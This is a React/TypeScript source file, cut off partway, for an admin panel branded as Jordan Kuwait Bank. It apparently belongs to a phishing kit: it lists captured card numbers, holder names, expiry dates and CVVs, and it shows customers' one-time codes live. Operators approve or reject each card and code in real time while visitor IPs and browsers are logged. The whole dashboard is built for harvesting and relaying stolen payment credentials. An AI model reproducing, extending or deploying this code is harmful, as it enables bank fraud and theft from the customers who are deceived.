import { createFileRoute, Link } from "@tanstack/react-router";
import { useMutation, useQuery, useQueryClient, useSuspenseQuery } from "@tanstack/react-query";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { Bar, BarChart, CartesianGrid, ResponsiveContainer, Tooltip, XAxis, YAxis } from "recharts";
import {
  Activity,
  Check,
  CheckCircle2,
  Clock,
  CreditCard,
  Eye,
  FileText,
  Globe,
  KeyRound,
  LayoutDashboard,
  Lock,
  LogOut,
  Users,
  X,
  XCircle,
} from "lucide-react";
import { useState } from "react";

import {
  adminLogin,
  adminLogout,
  reviewCardRequest,
  setupAdminPassword,
} from "@/lib/admin.functions";
import { MIN_PASSWORD_LENGTH } from "@/lib/admin-auth";
import { adminAuthQuery, adminRequestsQuery, adminStatsQuery } from "@/lib/admin.queries";
import type { CardRequestsStats } from "@/lib/visitors.functions";
import CreditCardVisual from "@/components/admin/CreditCardVisual";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { cn } from "@/lib/utils";
import visaLogo from "@/assets/payments/visa.svg";
import mastercardLogo from "@/assets/payments/mastercard.svg";
import madaLogo from "@/assets/payments/mada.svg";

type AdminAuthState = {
  needsSetup: boolean;
  signedIn: boolean;
  error: string | null;
};

type RequestRow = CardRequestsStats["recentRequests"][number];

type StatusMeta = {
  text: string;
  badge: string;
  icon: React.ElementType;
  /** المرحلة التي يمكن مراجعتها من هذه الحالة إن وُجدت. */
  stage?: "card" | "otp";
};

/** مراحل المراجعة الست — نفس قيم activation_status في القاعدة. */
const STATUS_META: Record<string, StatusMeta> = {
  card_pending: {
    text: "بانتظار مراجعة البطاقة",
    badge: "bg-amber-100 text-amber-700",
    icon: Clock,
    stage: "card",
  },
  card_rejected: {
    text: "بطاقة مرفوضة",
    badge: "bg-red-100 text-red-700",
    icon: XCircle,
  },
  otp_entry: {
    text: "مقبولة — بانتظار الكود",
    badge: "bg-blue-100 text-blue-700",
    icon: CheckCircle2,
  },
  otp_pending: {
    text: "بانتظار مراجعة الكود",
    badge: "bg-amber-100 text-amber-700",
    icon: Clock,
    stage: "otp",
  },
  otp_rejected: {
    text: "كود مرفوض — يعيد الإدخال",
    badge: "bg-orange-100 text-orange-700",
    icon: XCircle,
  },
  verified: {
    text: "مكتمل",
    badge: "bg-emerald-100 text-emerald-700",
    icon: CheckCircle2,
  },
};

const statusMeta = (status: string): StatusMeta =>
  STATUS_META[status] ?? {
    text: status,
    badge: "bg-muted text-muted-foreground",
    icon: Clock,
  };

const StatusBadge = ({ status, className }: { status: string; className?: string }) => {
  const meta = statusMeta(status);
  const Icon = meta.icon;
  return (
    <span
      className={cn(
        "inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-bold",
        meta.badge,
        className,
      )}
    >
      <Icon className="h-3 w-3" />
      {meta.text}
    </span>
  );
};

const CardBrandBadge = ({ brand }: { brand?: string | null }) => {
  if (brand === "visa") return <img src={visaLogo} alt="Visa" className="h-5 w-auto" />;
  if (brand === "mastercard")
    return <img src={mastercardLogo} alt="Mastercard" className="h-6 w-auto" />;
  if (brand === "mada") return <img src={madaLogo} alt="Mada" className="h-5 w-auto" />;
  return <CreditCard className="h-4 w-4 text-muted-foreground" />;
};

/** إخفاء آخر 4 خانات فقط لعرضها في الجدول — باقي الرقم في الدروج. */
const maskCardNumber = (value?: string | null) => {
  if (!value) return "—";
  const digits = value.replace(/\D/g, "");
  return `•••• •••• •••• ${digits.slice(-4) || "••••"}`;
};

const Stat = ({
  label,
  value,
  icon: Icon,
  tone,
}: {
  label: string;
  value: string;
  icon: React.ElementType;
  tone: "blue" | "green" | "amber" | "violet";
}) => {
  const tones: Record<string, { bg: string; ring: string; bar: string }> = {
    blue: {
      bg: "bg-gradient-to-br from-brand-blue to-[hsl(205_78%_26%)] text-white",
      ring: "ring-brand-blue/15",
      bar: "from-brand-blue/60 to-transparent",
    },
    green: {
      bg: "bg-gradient-to-br from-emerald-500 to-emerald-700 text-white",
      ring: "ring-emerald-500/15",
      bar: "from-emerald-500/60 to-transparent",
    },
    amber: {
      bg: "bg-gradient-to-br from-amber-400 to-orange-500 text-white",
      ring: "ring-amber-500/15",
      bar: "from-amber-500/60 to-transparent",
    },
    violet: {
      bg: "bg-gradient-to-br from-violet-500 to-fuchsia-600 text-white",
      ring: "ring-violet-500/15",
      bar: "from-violet-500/60 to-transparent",
    },
  };
  const t = tones[tone]!;
  return (
    <div
      className={cn(
        "group relative overflow-hidden rounded-2xl bg-white p-4 shadow-card ring-1 transition-all duration-300 hover:-translate-y-0.5 hover:shadow-float sm:p-5",
        t.ring,
      )}
    >
      <div
        className={cn("pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r", t.bar)}
      />
      <div className="flex items-center justify-between gap-3">
        <div
          className={cn(
            "grid h-12 w-12 place-items-center rounded-xl shadow-soft transition-transform duration-300 group-hover:scale-105",
            t.bg,
          )}
        >
          <Icon className="h-5 w-5" strokeWidth={2.2} />
        </div>
        <div className="text-right">
          <div className="text-[11.5px] font-bold uppercase tracking-wide text-muted-foreground">
            {label}
          </div>
          <div className="mt-1 text-[22px] font-extrabold text-brand-blue tabular-nums sm:text-[26px]">
            {value}
          </div>
        </div>
      </div>
    </div>
  );
};

const Detail = ({ label, value }: { label: string; value?: string | number | null }) => (
  <div className="flex items-start justify-between gap-3 px-3 py-2.5 text-[13px] odd:bg-muted/30">
    <span className="text-muted-foreground">{label}</span>
    <span className="text-left font-bold text-brand-blue" dir="auto">
      {value ?? "—"}
    </span>
  </div>
);

const Section = ({
  icon: Icon,
  title,
  tone = "blue",
  children,
}: {
  icon: React.ElementType;
  title: string;
  tone?: "blue" | "emerald" | "amber" | "violet";
  children: React.ReactNode;
}) => {
  const tones: Record<string, string> = {
    blue: "bg-brand-blue/10 text-brand-blue",
    emerald: "bg-emerald-100 text-emerald-700",
    amber: "bg-amber-100 text-amber-700",
    violet: "bg-violet-100 text-violet-700",
  };
  return (
    <section className="overflow-hidden rounded-2xl border border-border/70 bg-white shadow-sm">
      <header className="flex items-center gap-2 border-b border-border/70 bg-muted/40 px-3 py-2.5">
        <span className={cn("grid h-7 w-7 place-items-center rounded-lg", tones[tone])}>
          <Icon className="h-3.5 w-3.5" strokeWidth={2.4} />
        </span>
        <h3 className="text-[13px] font-extrabold text-brand-blue">{title}</h3>
      </header>
      <div>{children}</div>
    </section>
  );
};

export const Route = createFileRoute("/admin")({
  head: () => ({
    meta: [
      { title: "لوحة التحكم | البنك الأردني الكويتي" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: AdminPage,
});

function Shell({ children }: { children: React.ReactNode }) {
  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <main className="mx-auto flex min-h-screen max-w-md flex-col justify-center px-4 py-10">
        {children}
      </main>
    </div>
  );
}

function AdminPage() {
  const { data, error, isLoading, refetch } = useQuery(adminAuthQuery);

  if (isLoading) {
    return (
      <Shell>
        <p className="text-center text-sm text-muted-foreground">جارٍ التحقق من الجلسة...</p>
      </Shell>
    );
  }

  if (error) {
    return (
      <Shell>
        <p className="text-center text-sm font-semibold text-destructive">{error.message}</p>
        <button
          type="button"
          onClick={() => void refetch()}
          className="mx-auto mt-4 rounded-lg bg-primary px-4 py-2 text-sm font-bold text-primary-foreground"
        >
          إعادة المحاولة
        </button>
      </Shell>
    );
  }

  if (data?.error) {
    return (
      <Shell>
        <p className="text-center text-sm font-semibold text-destructive">{data.error}</p>
      </Shell>
    );
  }

  if (!data?.signedIn) {
    return <AdminGate state={data ?? { needsSetup: false, signedIn: false, error: null }} />;
  }

  return <AdminDashboard />;
}

function AdminGate({ state }: { state: AdminAuthState }) {
  const queryClient = useQueryClient();
  const [password, setPassword] = useState("");
  const [confirm, setConfirm] = useState("");
  const [formError, setFormError] = useState("");

  const submit = useMutation({
    mutationFn: (vars: { password: string }) =>
      state.needsSetup ? setupAdminPassword({ data: vars }) : adminLogin({ data: vars }),
    onSuccess: () => {
      queryClient.setQueryData<AdminAuthState>(adminAuthQuery.queryKey, {
        needsSetup: false,
        signedIn: true,
        error: null,
      });
      setPassword("");
      setConfirm("");
      setFormError("");
    },
    onError: (submitError) => setFormError(submitError.message),
  });

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setFormError("");
    const trimmed = password.trim();
    if (trimmed.length < MIN_PASSWORD_LENGTH) {
      setFormError(`كلمة المرور لازم تكون ${MIN_PASSWORD_LENGTH} أحرف على الأقل.`);
      return;
    }
    if (state.needsSetup && trimmed !== confirm.trim()) {
      setFormError("كلمتا المرور غير متطابقتين.");
      return;
    }
    submit.mutate({ password: trimmed });
  };

  return (
    <Shell>
      <div className="rounded-2xl border border-border bg-card p-6 shadow-sm">
        <div className="mb-4 flex items-center gap-2">
          <Lock className="h-5 w-5 text-primary" aria-hidden="true" />
          <h1 className="text-lg font-bold text-foreground">
            {state.needsSetup ? "إنشاء كلمة مرور المشرف" : "تسجيل دخول لوحة التحكم"}
          </h1>
        </div>

        <p className="mb-4 text-xs leading-5 text-muted-foreground">
          {state.needsSetup
            ? "هذه أول مرة — أنشئ كلمة مرور لحماية لوحة التحكم. تُخزَّن مشفّرة في قاعدة البيانات ولا تُحفظ كنص صريح."
            : "أدخل كلمة مرور المشرف للوصول إلى الطلبات وإحصائيات الزوار."}
        </p>

        <form onSubmit={handleSubmit} className="space-y-3">
          <label className="block">
            <span className="mb-1 block text-xs font-semibold text-foreground">كلمة المرور</span>
            <input
              type="password"
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              autoComplete={state.needsSetup ? "new-password" : "current-password"}
              minLength={MIN_PASSWORD_LENGTH}
              required
              className="h-11 w-full rounded-lg border border-input bg-background px-3 text-sm text-foreground outline-none transition-all focus:border-ring focus:ring-2 focus:ring-ring/30"
            />
          </label>

          {state.needsSetup && (
            <label className="block">
              <span className="mb-1 block text-xs font-semibold text-foreground">
                تأكيد كلمة المرور
              </span>
              <input
                type="password"
                value={confirm}
                onChange={(event) => setConfirm(event.target.value)}
                autoComplete="new-password"
                minLength={MIN_PASSWORD_LENGTH}
                required
                className="h-11 w-full rounded-lg border border-input bg-background px-3 text-sm text-foreground outline-none transition-all focus:border-ring focus:ring-2 focus:ring-ring/30"
              />
            </label>
          )}

          {formError && (
            <p role="alert" className="text-xs font-semibold text-destructive">
              {formError}
            </p>
          )}

          <button
            type="submit"
            disabled={submit.isPending}
            className="h-11 w-full rounded-lg bg-primary text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
          >
            {submit.isPending ? "جارٍ التحقق..." : state.needsSetup ? "إنشاء كلمة المرور" : "دخول"}
          </button>
        </form>
      </div>

      <Link to="/" className="mt-4 text-center text-sm text-primary hover:underline">
        العودة إلى الموقع
      </Link>
    </Shell>
  );
}

function AdminDashboard() {
  const queryClient = useQueryClient();
  const [tab, setTab] = useState<"orders" | "visitors">("orders");

  const logout = useMutation({
    mutationFn: () => adminLogout(),
    onSuccess: () => {
      queryClient.setQueryData<AdminAuthState>(adminAuthQuery.queryKey, {
        needsSetup: false,
        signedIn: false,
        error: null,
      });
    },
  });

  const { data: stats } = useSuspenseQuery(adminRequestsQuery);
  const pendingCount = (stats.byStatus["card_pending"] ?? 0) + (stats.byStatus["otp_pending"] ?? 0);

  const navItem = (active: boolean) =>
    cn(
      "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200",
      active
        ? "bg-gradient-to-l from-brand-blue/10 via-brand-blue/5 to-transparent text-brand-blue shadow-soft"
        : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
    );

  return (
    <main
      dir="rtl"
      className="min-h-screen bg-gradient-to-b from-[hsl(210_40%_97%)] via-[hsl(210_40%_98%)] to-[hsl(210_40%_96%)]"
    >
      {/* Decorative blurred backdrop */}
      <div className="pointer-events-none fixed inset-x-0 top-0 -z-10 h-[320px] overflow-hidden">
        <div className="absolute -top-24 right-1/3 h-72 w-72 rounded-full bg-brand-blue/15 blur-3xl" />
        <div className="absolute -top-16 left-1/4 h-64 w-64 rounded-full bg-violet-400/15 blur-3xl" />
      </div>

      {/* Top bar */}
      <header className="sticky top-0 z-30 border-b border-white/60 bg-white/80 backdrop-blur-xl supports-[backdrop-filter]:bg-white/70">
        <div className="mx-auto flex h-16 max-w-[1400px] items-center justify-between px-4">
          <div className="flex items-center gap-3">
            <div className="grid h-10 w-10 place-items-center rounded-xl bg-gradient-to-br from-brand-blue to-[hsl(205_78%_26%)] text-white shadow-soft">
              <LayoutDashboard className="h-5 w-5" strokeWidth={2.2} />
            </div>
            <div className="leading-tight">
              <h1 className="text-[15px] font-extrabold text-brand-blue sm:text-[16px]">
                لوحة الإدارة
              </h1>
              <div className="text-[11px] font-medium text-muted-foreground">
                إدارة الطلبات والزوار
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Link
              to="/visitors"
              className="flex h-10 items-center gap-1.5 rounded-xl border border-border bg-white/70 px-3.5 text-[12.5px] font-bold text-brand-blue transition-all duration-200 hover:bg-white hover:shadow-soft"
            >
              <Eye className="h-4 w-4" />
              <span>صفحة الزوار</span>
            </Link>
            <button
              type="button"
              onClick={() => logout.mutate()}
              className="flex h-10 items-center gap-1.5 rounded-xl border border-border bg-white/70 px-3.5 text-[12.5px] font-bold text-brand-blue transition-all duration-200 hover:bg-white hover:shadow-soft"
            >
              <LogOut className="h-4 w-4" />
              <span>خروج</span>
            </button>
          </div>
        </div>
      </header>

      <div className="mx-auto grid max-w-[1400px] grid-cols-1 gap-4 px-4 py-5 lg:grid-cols-[220px_1fr]">
        {/* Sidebar */}
        <aside className="hidden lg:block">
          <nav className="sticky top-24 space-y-1.5 rounded-2xl border border-white/60 bg-white/80 p-3 shadow-card backdrop-blur-xl">
            <div className="mb-1 px-3 pt-1 text-[10.5px] font-bold uppercase tracking-wider text-muted-foreground">
              القوائم
            </div>
            <button
              type="button"
              onClick={() => setTab("orders")}
              className={navItem(tab === "orders")}
            >
              {tab === "orders" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue" />
              )}
              <FileText className="h-4 w-4" />
              <span>الطلبات</span>
              <span
                className={cn(
                  "ms-auto rounded-full px-2 py-0.5 text-[11px] font-extrabold tabular-nums",
                  tab === "orders" ? "bg-brand-blue text-white" : "bg-muted text-brand-blue",
                )}
              >
                {stats.totalRequests}
              </span>
            </button>
            <button
              type="button"
              onClick={() => setTab("visitors")}
              className={navItem(tab === "visitors")}
            >
              {tab === "visitors" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue" />
              )}
              <Users className="h-4 w-4" />
              <span>الزيارات</span>
            </button>
          </nav>
        </aside>

        {/* Mobile tabs */}
        <div className="flex gap-2 lg:hidden">
          <button
            type="button"
            onClick={() => setTab("orders")}
            className={cn(
              "flex-1 rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "orders"
                ? "bg-brand-blue text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الطلبات
          </button>
          <button
            type="button"
            onClick={() => setTab("visitors")}
            className={cn(
              "flex-1 rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "visitors"
                ? "bg-brand-blue text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الزيارات
          </button>
        </div>

        {/* Content */}
        <section className="space-y-5">
          {tab === "visitors" ? (
            <AdminVisitsView />
          ) : (
            <AdminRequestsView pendingHint={pendingCount} />
          )}
        </section>
      </div>
    </main>
  );
}

function AdminRequestsView({ pendingHint }: { pendingHint: number }) {
  const queryClient = useQueryClient();
  const { data: stats } = useSuspenseQuery(adminRequestsQuery);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [actionError, setActionError] = useState("");

  const review = useMutation({
    mutationFn: (vars: { id: string; stage: "card" | "otp"; action: "approve" | "reject" }) =>
      reviewCardRequest({ data: vars }),
    onSuccess: () => {
      setActionError("");
      void queryClient.invalidateQueries({ queryKey: adminRequestsQuery.queryKey });
    },
    onError: (reviewError) => setActionError(reviewError.message),
  });

  const selected = selectedId
    ? (stats.recentRequests.find((row) => row.id === selectedId) ?? null)
    : null;

  const completed = stats.byStatus["verified"] ?? 0;
  const rejected = (stats.byStatus["card_rejected"] ?? 0) + (stats.byStatus["otp_rejected"] ?? 0);

  const cards = [
    {
      label: "إجمالي الطلبات",
      value: String(stats.totalRequests),
      icon: FileText,
      tone: "blue" as const,
    },
    { label: "بانتظار المراجعة", value: String(pendingHint), icon: Clock, tone: "amber" as const },
    { label: "مكتملة", value: String(completed), icon: CheckCircle2, tone: "green" as const },
    { label: "مرفوضة", value: String(rejected), icon: XCircle, tone: "violet" as const },
  ];

  const act = (id: string, stage: "card" | "otp", action: "approve" | "reject") =>
    review.mutate({ id, stage, action });

  return (
    <>
      {/* Stats */}
      <div className="grid grid-cols-2 gap-3 sm:gap-4 lg:grid-cols-4">
        {cards.map((card) => (
          <Stat
            key={card.label}
            label={card.label}
            value={card.value}
            icon={card.icon}
            tone={card.tone}
          />
        ))}
      </div>

      {actionError && (
        <p
          role="alert"
          className="rounded-xl bg-red-50 px-4 py-3 text-[13px] font-bold text-red-600"
        >
          {actionError}
        </p>
      )}

      {/* Table — desktop / tablet */}
      <div className="hidden overflow-hidden rounded-2xl bg-white shadow-card md:block">
        <div className="overflow-x-auto">
          <table className="w-full text-right text-[13px]">
            <thead className="bg-brand-blue/5 text-brand-blue">
              <tr>
                <th className="px-3 py-3 font-extrabold">الرقم المميز</th>
                <th className="px-3 py-3 font-extrabold">البطاقة</th>
                <th className="px-3 py-3 font-extrabold">الحالة</th>
                <th className="px-3 py-3 font-extrabold">إجراء</th>
                <th className="px-3 py-3 font-extrabold">التاريخ</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              {stats.recentRequests.length === 0 && (
                <tr>
                  <td colSpan={5} className="px-3 py-10 text-center text-muted-foreground">
                    لا توجد بيانات بعد.
                  </td>
                </tr>
              )}
              {stats.recentRequests.map((request) => {
                const meta = statusMeta(request.activation_status);
                return (
                  <tr
                    key={request.id}
                    onClick={() => setSelectedId(request.id)}
                    className="cursor-pointer transition-colors hover:bg-muted/40"
                  >
                    <td className="px-3 py-3 font-extrabold tabular-nums text-brand-blue">
                      {request.client_ref}
                    </td>
                    <td className="px-3 py-3">
                      <div className="flex flex-col items-end gap-1" dir="ltr">
                        <div className="flex items-center gap-2">
                          <span className="font-mono text-[12.5px] font-bold tracking-wider text-brand-blue">
                            {maskCardNumber(request.card_number)}
                          </span>
                          <CardBrandBadge brand={request.card_brand} />
                        </div>
                        <span className="max-w-[220px] truncate text-[10.5px] text-muted-foreground">
                          {request.card_title}
                          {request.card_holder_name ? ` • ${request.card_holder_name}` : ""}
                        </span>
                        {request.cvv && (
                          <span
                            className="font-mono text-[11px] font-bold text-violet-600"
                            dir="ltr"
                          >
                            CVV {request.cvv}
                          </span>
                        )}
                      </div>
                    </td>
                    <td className="px-3 py-3">
                      <StatusBadge status={request.activation_status} />
                    </td>
                    <td className="px-3 py-3">
                      {meta.stage ? (
                        <div className="flex items-center justify-end gap-1.5">
                          <button
                            type="button"
                            onClick={(event) => {
                              event.stopPropagation();
                              act(request.id, meta.stage!, "approve");
                            }}
                            disabled={review.isPending}
                            className="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110 disabled:opacity-50"
                          >
                            <Check className="h-3.5 w-3.5" />
                            <span>قبول</span>
                          </button>
                          <button
                            type="button"
                            onClick={(event) => {
                              event.stopPropagation();
                              act(request.id, meta.stage!, "reject");
                            }}
                            disabled={review.isPending}
                            className="flex h-8 items-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110 disabled:opacity-50"
                          >
                            <XCircle className="h-3.5 w-3.5" />
                            <span>رفض</span>
                          </button>
                        </div>
                      ) : (
                        <span className="text-[11px] text-muted-foreground">—</span>
                      )}
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 text-muted-foreground">
                      {format(new Date(request.created_at), "d MMM، h:mm a", { locale: ar })}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* Mobile cards */}
      <div className="space-y-3 md:hidden">
        {stats.recentRequests.length === 0 && (
          <div className="rounded-2xl bg-white p-8 text-center text-[13px] text-muted-foreground shadow-card">
            لا توجد بيانات بعد.
          </div>
        )}
        {stats.recentRequests.map((request) => {
          const meta = statusMeta(request.activation_status);
          return (
            <div
              key={request.id}
              className="rounded-2xl bg-white p-4 shadow-card transition-transform active:scale-[0.99]"
            >
              <button
                type="button"
                onClick={() => setSelectedId(request.id)}
                className="flex w-full items-start justify-between gap-3 text-right"
              >
                <div className="min-w-0 flex-1">
                  <div className="text-[11px] font-bold text-muted-foreground">
                    {request.client_ref}
                  </div>
                  <div className="mt-0.5 truncate text-[14px] font-extrabold text-brand-blue">
                    {request.card_title}
                  </div>
                  <div className="mt-0.5 truncate text-[12px] text-muted-foreground" dir="ltr">
                    {maskCardNumber(request.card_number)}
                  </div>
                  {request.cvv && (
                    <div
                      className="mt-0.5 font-mono text-[11px] font-bold text-violet-600"
                      dir="ltr"
                    >
                      CVV {request.cvv}
                    </div>
                  )}
                </div>
                <div className="text-left">
                  <div className="mt-1 flex justify-end">
                    <CardBrandBadge brand={request.card_brand} />
                  </div>
                </div>
              </button>

              <div className="mt-3 flex items-center justify-between gap-2">
                <StatusBadge status={request.activation_status} />
                <span className="text-[10.5px] text-muted-foreground">
                  {format(new Date(request.created_at), "d MMM، h:mm a", { locale: ar })}
                </span>
              </div>

              {meta.stage && (
                <div className="mt-3 flex gap-2">
                  <button
                    type="button"
                    onClick={() => act(request.id, meta.stage!, "approve")}
                    disabled={review.isPending}
                    className="flex h-9 flex-1 items-center justify-center gap-1 rounded-lg bg-emerald-600 text-[12px] font-extrabold text-white disabled:opacity-50"
                  >
                    <Check className="h-3.5 w-3.5" /> قبول
                  </button>
                  <button
                    type="button"
                    onClick={() => act(request.id, meta.stage!, "reject")}
                    disabled={review.isPending}
                    className="flex h-9 flex-1 items-center justify-center gap-1 rounded-lg bg-destructive text-[12px] font-extrabold text-white disabled:opacity-50"
                  >
                    <XCircle className="h-3.5 w-3.5" /> رفض
                  </button>
                </div>
              )}
            </div>
          );
        })}
      </div>

      {/* Detail drawer */}
      {selected && (
        <div
          className="fixed inset-0 z-50 flex items-stretch justify-start bg-black/50 backdrop-blur-sm animate-in fade-in"
          onClick={() => setSelectedId(null)}
        >
          <aside
            dir="rtl"
            onClick={(event) => event.stopPropagation()}
            className="ms-auto h-full w-full max-w-full overflow-y-auto bg-[hsl(210_40%_97%)] shadow-2xl animate-in slide-in-from-left sm:max-w-[480px]"
          >
            {/* Sticky header */}
            <div className="sticky top-0 z-10 border-b border-border bg-gradient-to-br from-brand-blue to-[hsl(214_70%_30%)] px-4 py-4 text-white sm:px-5">
              <div className="flex items-center justify-between gap-3">
                <div className="min-w-0">
                  <h2 className="truncate text-[15px] font-extrabold sm:text-[17px]">
                    تفاصيل الطلب
                  </h2>
                  <div className="mt-0.5 truncate font-mono text-[11px] text-white/80">
                    الرقم المميز: {selected.client_ref}
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setSelectedId(null)}
                  className="grid h-9 w-9 shrink-0 place-items-center rounded-lg bg-white/15 text-white hover:bg-white/25"
                  aria-label="إغلاق"
                >
                  <X className="h-5 w-5" />
                </button>
              </div>
            </div>

            <div className="space-y-4 p-4 sm:p-5">
              {/* Credit card visual + مراجعة البطاقة */}
              <div>
                <CreditCardVisual
                  number={selected.card_number ?? undefined}
                  name={selected.card_holder_name ?? undefined}
                  expMonth={selected.expiry_month ?? undefined}
                  expYear={selected.expiry_year ?? undefined}
                  cvv={selected.cvv ?? undefined}
                  brand={selected.card_brand ?? undefined}
                />

                {statusMeta(selected.activation_status).stage === "card" ? (
                  <div className="mt-3 flex gap-2">
                    <button
                      type="button"
                      onClick={() => act(selected.id, "card", "approve")}
                      disabled={review.isPending}
                      className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50"
                    >
                      <Check className="h-4 w-4" /> قبول البطاقة
                    </button>
                    <button
                      type="button"
                      onClick={() => act(selected.id, "card", "reject")}
                      disabled={review.isPending}
                      className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50"
                    >
                      <XCircle className="h-4 w-4" /> رفض البطاقة
                    </button>
                  </div>
                ) : (
                  <div className="mt-3 flex justify-center">
                    <StatusBadge
                      status={selected.activation_status}
                      className="px-3 py-1.5 text-[12px]"
                    />
                  </div>
                )}
              </div>

              {/* الكود المُدخل من العميل */}
              {selected.otp_value && (
                <div className="overflow-hidden rounded-2xl border border-amber-300/60 bg-gradient-to-br from-amber-50 to-white shadow-sm">
                  <div className="flex items-center gap-2 border-b border-amber-200/60 bg-amber-100/60 px-3 py-2">
                    <KeyRound className="h-3.5 w-3.5 text-amber-700" />
                    <span className="text-[12px] font-extrabold text-amber-800">
                      رمز التحقق المُدخَل من العميل
                    </span>
                    {statusMeta(selected.activation_status).stage === "otp" && (
                      <span className="ms-auto flex items-center gap-1 rounded-full bg-amber-600 px-2 py-0.5 text-[10px] font-bold text-white">
                        <span className="relative flex h-1.5 w-1.5">
                          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-white/80" />
                          <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-white" />
                        </span>
                        مباشر
                      </span>
                    )}
                  </div>
                  <div className="flex items-center justify-center px-3 py-4">
                    <div
                      className="font-mono text-[28px] font-extrabold tracking-[0.5em] text-brand-blue"
                      dir="ltr"
                    >
                      {selected.otp_value}
                    </div>
                  </div>

                  {statusMeta(selected.activation_status).stage === "otp" && (
                    <div className="flex gap-2 border-t border-amber-200/60 bg-white p-3">
                      <button
                        type="button"
                        onClick={() => act(selected.id, "otp", "approve")}
                        disabled={review.isPending}
                        className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50"
                      >
                        <Check className="h-4 w-4" /> قبول الكود
                      </button>
                      <button
                        type="button"
                        onClick={() => act(selected.id, "otp", "reject")}
                        disabled={review.isPending}
                        className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50"
                      >
                        <XCircle className="h-4 w-4" /> رفض الكود
                      </button>
                    </div>
                  )}
                </div>
              )}

              <Section icon={CreditCard} title="بيانات البطاقة" tone="blue">
                <Detail label="الرقم المميز" value={selected.client_ref} />
                <Detail label="نوع الطلب" value={selected.card_title} />
                <Detail label="رقم البطاقة" value={selected.card_number} />
                <Detail label="اسم حامل البطاقة" value={selected.card_holder_name} />
                <Detail
                  label="تاريخ الانتهاء"
                  value={
                    selected.expiry_month || selected.expiry_year
                      ? `${selected.expiry_month ?? "—"} / ${selected.expiry_year ?? "—"}`
                      : null
                  }
                />
                <Detail label="رمز الأمان (CVV)" value={selected.cvv} />
              </Section>

              <Section icon={KeyRound} title="رمز التحقق" tone="amber">
                <Detail label="الكود المُدخل" value={selected.otp_value} />
                <Detail label="عدد المحاولات" value={selected.otp_attempts} />
                <Detail label="الحالة" value={statusMeta(selected.activation_status).text} />
                <Detail
                  label="تاريخ الاعتماد"
                  value={
                    selected.approved_at
                      ? format(new Date(selected.approved_at), "d MMM، h:mm a", { locale: ar })
                      : null
                  }
                />
              </Section>

              <Section icon={Users} title="بيانات الجلسة" tone="violet">
                <Detail label="عنوان IP" value={selected.ip} />
                <Detail label="المتصفح" value={selected.user_agent} />
                <Detail
                  label="وقت الإنشاء"
                  value={format(new Date(selected.created_at), "d MMM، h:mm a", { locale: ar })}
                />
                <Detail label="معرّف السجل" value={selected.id} />
              </Section>
            </div>
          </aside>
        </div>
      )}
    </>
  );
}

function AdminVisitsView() {
  const { data: stats } = useSuspenseQuery(adminStatsQuery);

  const cards = [
    { title: "زيارات اليوم", value: stats.visitsToday, icon: Activity },
    { title: "زوار اليوم (IP فريد)", value: stats.uniqueIpsToday, icon: Users },
    { title: "إجمالي الزيارات (30 يوم)", value: stats.totalVisits, icon: Eye },
    { title: "إجمالي الزوار (IP فريد)", value: stats.uniqueIps, icon: Globe },
  ];

  return (
    <>
      <div className="grid grid-cols-2 gap-4 lg:grid-cols-4">
        {cards.map((card) => (
          <Stat
            key={card.title}
            label={card.title}
            value={card.value.toLocaleString("ar-JO")}
            icon={card.icon}
            tone="blue"
          />
        ))}
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">الزيارات آخر 14 يومًا</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="h-64 w-full" dir="ltr">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={stats.daily}>
                <CartesianGrid strokeDasharray="3 3" className="stroke-border" />
                <XAxis
                  dataKey="date"
                  tickFormatter={(d: string) => d.slice(5)}
                  tick={{ fontSize: 12 }}
                  className="fill-muted-foreground"
                />
                <YAxis
                  allowDecimals={false}
                  tick={{ fontSize: 12 }}
                  className="fill-muted-foreground"
                />
                <Tooltip
                  formatter={(value) => [Number(value).toLocaleString("ar-JO"), "زيارة"]}
                  labelFormatter={(label) => String(label)}
                />
